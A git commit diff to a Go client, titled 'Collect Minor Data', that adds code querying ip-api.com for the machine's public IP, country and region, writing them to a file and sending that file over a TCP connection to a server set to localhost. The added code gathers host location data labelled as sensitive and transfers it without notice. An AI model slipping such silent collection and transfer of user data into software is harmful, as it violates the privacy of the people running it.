e016f282a9e93d061356e2d287a2461f6e11e403
Mimmo Baluyut <mimmo.baluyut@icloud.com>
2023-11-08 11:40:15 -0500

    Collect Minor Data

--- client/main.go
+++ client/main.go
@@ -1,9 +1,11 @@
 package main
 
 import (
+	"encoding/json"
 	"io"
 	"log"
 	"net"
+	"net/http"
 	"os"
 	"strconv"
 )
@@ -12,11 +14,48 @@ const (
 	HOST       = "localhost"
 	PORT       = "8080"
 	TYPE       = "tcp"
-	PATH       = "dummyfile.txt"
 	BUFFERSIZE = 1024
+	PATH       = "datafile.txt"
 )
 
+type IPApiData struct {
+	CountryCode string
+	Region      string
+	Query       string
+}
+
 var logger = log.New(os.Stdout, "INFO: ", log.Ldate|log.Ltime)
+
+func GetExtData() IPApiData {
+	request, err := http.Get("http://ip-api.com/json/")
+	handleError(err)
+	defer request.Body.Close()
+
+	body, err := io.ReadAll(request.Body)
+	handleError(err)
+
+	var extData IPApiData
+	json.Unmarshal(body, &extData)
+
+	return extData
+}
+
+// Bad way of doing this shit
+func FormatAndWriteData(data IPApiData) {
+	var (
+		lines     = []string{"Country: " + data.CountryCode, "Region: " + data.Region, "IP: " + data.Query}
+		file, err = os.Create(PATH)
+	)
+	handleError(err)
+	defer file.Close()
+
+	// dont need to do this, could just send the array of lines as bytes
+	for i := 0; i < len(lines); i++ {
+		_, err := file.WriteString(lines[i] + "\n")
+		handleError(err)
+		file.Sync()
+	}
+}
 
 // Fill string with : to fit into buffer
 func fillString(retunString string, toLength int) string {
@@ -37,6 +76,9 @@ func main() {
 	conn, err := net.Dial(TYPE, CONNECT)
 	handleError(err)
 	defer conn.Close()
+
+	sensitiveData := GetExtData()
+	FormatAndWriteData(sensitiveData)
 
 	// Transfer file with collected data
 	SendFile(conn, PATH)
